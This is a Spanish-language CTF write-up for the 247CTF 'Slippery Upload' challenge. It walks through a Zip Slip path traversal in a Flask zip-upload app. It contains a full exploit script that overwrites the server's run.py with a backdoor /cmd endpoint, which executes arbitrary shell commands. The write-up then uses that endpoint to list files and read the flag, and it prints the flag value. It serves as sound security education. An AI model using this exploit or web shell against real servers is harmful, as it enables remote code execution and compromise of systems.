# Write-Up CTF: Slippery Upload
## Dificultad: Moderada

En este CTF nos enfrentamos a una aplicación web en Flask que permite subir archivos. El objetivo, como siempre, es encontrar la manera de comprometer el servidor para leer la flag.

### Análisis Inicial
Al iniciar el desafío, se nos presenta el código fuente de la aplicación:

```python
from flask import Flask, request
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'

@app.route('/')
def source():
    return '%s
' % open('/app/run.py').read()

def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())

@app.route('/zip_upload', methods=['POST'])
def zip_upload():
    try:
        if request.files and 'zarchive' in request.files:
            zarchive = request.files['zarchive']
            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                zarchive.save(zpath)
                zip_extract(zpath)
                return 'Zip archive uploaded and extracted!'
        return 'Only valid zip archives are acepted!'
    except:
         return 'Error occured during the zip upload process!'

if __name__ == '__main__':
    app.run()
``` 

El código es bastante directo:

Hay un endpoint /zip_upload que acepta peticiones POST. Valida que se envíe un archivo llamado zarchive, que sea un .zip y que su content_type sea application/octet-stream.Si todo es correcto, guarda el zip en /tmp/uploads/ con un nombre aleatorio.

Llama a la función zip_extract, que descomprime el archivo.

La parte más interesante y peligrosa está aquí:

```python
def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            # ¡Peligro! i.filename viene del archivo ZIP y no se sanea.
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())
```

La función zip_extract itera sobre cada archivo dentro del zip y usa su nombre (i.filename) para crear una ruta donde se guardará el contenido. El problema es que no valida ni sanea el nombre del archivo. Esto abre la puerta a una vulnerabilidad de Path Traversal, más conocida en este contexto como Zip Slip.

## Zip Slip
El exploit de Zip Slip consiste en crear un archivo zip que contenga ficheros con nombres maliciosos, como por ejemplo ../../../etc/passwd. Al descomprimirlo en un servidor vulnerable, la aplicación intentará escribir en /tmp/uploads/../../../etc/passwd, lo que se resuelve en la ruta /etc/passwd, permitiéndonos sobrescribir archivos arbitrarios del sistema.

# El plan fue el siguiente:

Crear un archivo .zip malicioso.

Dentro del zip, incluir un archivo llamado ../../../app/run.py. La idea es usar el Path Traversal para salir del directorio y sobrescribir el archivo run.py que la aplicación Flask está ejecutando.

El contenido de este nuevo run.py será un código modificado por mí que me dará ejecución remota de comandos (RCE).

Para crear el zip con el nombre de archivo malicioso, usé un script de Python, ya que los sistemas operativos como Windows no suelen permitir crear archivos con / en el nombre.

Este es el script final que usé para generar el zip y subirlo al servidor:

```python

import zipfile
import requests

malicious_code = """
from flask import Flask, request
import zipfile, os
from subprocess import Popen, PIPE

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'

@app.route('/')
def source():
    return 'Servidor comprometido'

def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())

@app.route('/zip_upload', methods=['POST'])
def zip_upload():
    return 'El servidor está comprometido.'

@app.route('/cmd', methods=['GET'])
def cmd_exec():
    try:
        if request.args and 'cmd' in request.args:
            command = request.args['cmd']
            process = Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
            stdout, stderr = process.communicate()
            return stdout.decode('utf-8') + stderr.decode('utf-8')
        return 'No se encontró el parámetro "cmd".'
    except Exception as e:
        return f'Ocurrió un error: {str(e)}'
"""

with zipfile.ZipFile("malicioso.zip", "w") as zf:
    zf.writestr("../../../app/run.py", malicious_code)


url = "https://8485f9de2dff1c21.247ctf.com/zip_upload"
zip_file_name = "malicioso.zip"

files = {
    'zarchive': (zip_file_name, open(zip_file_name, 'rb'), 'application/octet-stream')
}

try:
    response = requests.post(url, files=files)
    print(response)

except requests.exceptions.RequestException as e:
    print(e)
```

Al principio, mis intentos rompían la aplicación y me devolvía Internal Server Error. Esto suele pasar por errores de sintaxis o indentación en el código Python que se inyecta. Después de ajustar el malicious_code varias veces, finalmente funcionó.

## Análisis del Payload Malicioso
El código que inyecte (malicious_code) es una versión modificada de la aplicación Flask original, diseñada para obtener control del servidor. A modo de explación la ruta importante es @app.route('/cmd'). Este es el nuevo endpoint. El mismo funciona como la puerta trasera hacia el servidor. Espera un parámetro en la URL llamado cmd. 

process = Popen(command, stdout=PIPE, stderr=PIPE, shell=True): Esta es la línea clave. Ejecuta el comando que le pasamos.

shell=True: Es un parámetro de seguridad delicado. Es la forma de pedirle al sistema operativo que interprete el string del comando a través de su shell (/bin/sh en Linux).

stdout=PIPE, stderr=PIPE: Con estos parametros aclaro que quiero capturar tanto la salida estándar (stdout) como los errores (stderr) para poder verlos.

stdout.decode('utf-8') + stderr.decode('utf-8') es para leer la salida del comando, la decodificamos de bytes a string y la devolvemos en la respuesta HTTP. Así podemos ver el resultado de nuestros comandos directamente en el navegador o en la terminal.

Una vez que el script se ejecutó correctamente, el servidor estaba comprometido. El archivo /app/run.py original fue reemplazado por el mío, que contiene el nuevo endpoint /cmd.

Ahora solo quedaba usarlo para explorar el sistema de archivos y encontrar la flag. Comence enlistando los archivos en el directorio actual con ls:

https://8485f9de2dff1c21.247ctf.com/cmd?cmd=ls

La respuesta del servidor fue:

flag_33cd0604f65815a9375e2da04e1b8610.txt run.py

Me mostro directamente el archivo que estaba buscando, por lo que el siguiente paso fue leer su contenido con cat:

https://8485f9de2dff1c21.247ctf.com/cmd?cmd=cat+flag_33cd0604f65815a9375e2da04e1b8610.txt

Y asi devolvio la flag

247CTF{33cd0604f65815a9375e2da04e1b8610}

### Autor: Martin Cabral